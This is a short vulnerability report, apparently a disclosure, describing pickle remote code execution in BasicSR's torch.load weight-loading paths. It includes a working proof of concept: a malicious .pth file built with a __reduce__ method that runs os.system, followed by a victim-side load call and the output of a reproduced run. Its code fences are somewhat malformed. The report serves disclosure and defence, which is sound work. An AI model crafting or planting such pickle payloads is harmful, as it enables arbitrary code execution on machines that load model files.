# Malicious .pth weights → torch.load pickle RCE (training)

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
All load_network/resume paths call torch.load(path, map_location=...) without weights_only or integrity check.

## Impact
Malicious model file author → training host pickle RCE.

## PoC
```
```python
# 1. Attacker crafts malicious .pth:
import pickle, os

class MaliciousPickle:
    def __reduce__(self):
        return (os.system, ("echo basicsr-rce-proof > /tmp/basicsr_pwned",))

with open("evil_weights.pth", "wb") as f:
    pickle.dump(MaliciousPickle(), f)

# 2. Victim loads it (exact BasicSR resume/pretrained sink):
import torch
loaded = torch.load("evil_weights.pth", map_location=torch.device("cpu"))
# RCE fires here, before any model parsing
``` → os.system; torch.load executes it
```

## Execution result
```
REPRODUCED on torch 2.5.1: /tmp/basicsr_pwned created
```
